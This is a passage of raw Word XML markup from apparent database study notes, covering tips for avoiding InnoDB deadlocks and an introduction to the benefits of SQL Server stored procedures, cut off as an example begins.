          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>uses automatic row-level locking. You can get deadlocks even in the case of transactions that just insert or delete a single row. That is because these operations are not really</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Quote1"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Quote1"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>atomic</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Quote1"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>; they automatically set locks on the (possibly several) index records of the row inserted or deleted.</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You can cope with deadlocks and reduce the likelihood of their occurrence with the following techniques:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="225" w:afterAutospacing="0"/>
        <w:ind w:left="450"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:color w:val="555555"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="555555"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Always be prepared to re-issue a transaction if it fails due to deadlock. Deadlocks are not dangerous. Just try again.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="225" w:afterAutospacing="0"/>
        <w:ind w:left="450"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:color w:val="555555"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="555555"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Keep transactions small and short in duration to make them less prone to collision.</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Commit transactions immediately after making a set of related changes to make them less prone to collision. In particular, do not leave an interactive</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId36" w:tooltip="4.5.1 mysql — The MySQL Command-Line Tool" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="0074A3"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>mysql</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>session open for a long time with an uncommitted transaction.</w:t>
      </w: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r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>When modifying multiple tables within a transaction, or different sets of rows in the same table, do those operations in a consistent order each time. Then transactions form well-defined queues and do not deadlock. For example, organize database operations into functions within your application, or call stored routines, rather than coding multiple similar sequences of</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>INSERT</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>UPDATE</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, and</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>statements</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> in different places.</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 xml:space="preserve">Add well-chosen indexes to your tables. Then your queries need to scan fewer index records and consequently set fewer locks. Use </w:t>
      </w:r>
      <w:hyperlink r:id="rId37" w:tooltip="13.8.2 EXPLAIN Syntax" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="HTMLCode"/>
            <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>EXPLAIN SELECT</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>to determine which indexes the MySQL server regards as the most appropriate for your queries.</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If nothing else helps, serialize your transactions with table-level locks</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Another way to serialize transactions is to create an auxiliary</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Quote1"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Quote1"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>semaphore</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Quote1"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>table that contains just a single row. Have each transaction update that row before accessing other tables.</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r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Table-level locks prevent concurrent updates to the table, avoiding deadlocks at the expense of less responsiveness for a busy system.</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p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:spacing w:after="72" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>Tip#1 - Keep your transactions short</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:spacing w:after="72" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>Tip#2 - Be orderly about locks your code is going to acquire.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:spacing w:after="72" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>Tip#3 - Acquire locks as soon as possible with a transaction</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:spacing w:after="72" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>Tip#4 - Nested transactions don’t release locks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:spacing w:after="72" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>Tip#5 - Serialize your transactions with table locks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="273" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="273" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="555544"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t>Store Procedure:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="808080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="808080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Stored Procedure in SQL Server can be defined as the set of logically group of SQL statement which </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="808080"/>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> grouped to perform a specific task. This article will describe the Stored Procedure in SQL Server and their benefits.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Stored Procedure</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">: Stored Procedure in SQL Server can be defined as the set of </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>logical</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> group of SQL statements which are grouped to perform a specific task. There are many benefits of using a stored procedure. The main benefit of using a stored procedure is that it increases the performance of the database. The other benefits of using the Stored Procedure are given below.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pP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Benefits of Using the Stored Procedure</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>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 xml:space="preserve">One of the main benefits of using the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>Stored</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve"> procedure is that it reduces the amount of information sent to the database server. It can become a more important benefit when the bandwidth of the network is less. Since if we send the SQL query (statement) which is executing in a loop to the server through network and the network gets disconnected, then the execution of the SQL statement doesn't return the expected results, if the SQL query is not used between Transaction statement and rollback statement is not used.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>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Compilation step is required only once when the stored procedure is created. Then after it does not require recompilation before executing unless it is modified and reutilizes the same execution plan whereas the SQL statements need to be compiled every time whenever it is sent for execution even if we send the same SQL statement every time.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>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It helps in re usability of the SQL code because it can be used by multiple users and by multiple clients since we need to just call the stored procedure instead of writing the same SQL statement every time. It helps in reducing the development time.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>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 xml:space="preserve">Stored procedure is helpful in enhancing the security since we can grant permission to the user for executing the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>Stored</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve"> procedure instead of giving permission on the tables used in the Stored procedure.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>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Sometimes, it is useful to use the database for storing the business logic in the form of stored procedure since it makes it secure and if any change is needed in the business logic, then we may only need to make changes in the stored procedure and not in the files contained on the web server.</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How to Write a Stored Procedure in SQL Server</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Suppose there is a table called</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>tbl_Students</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
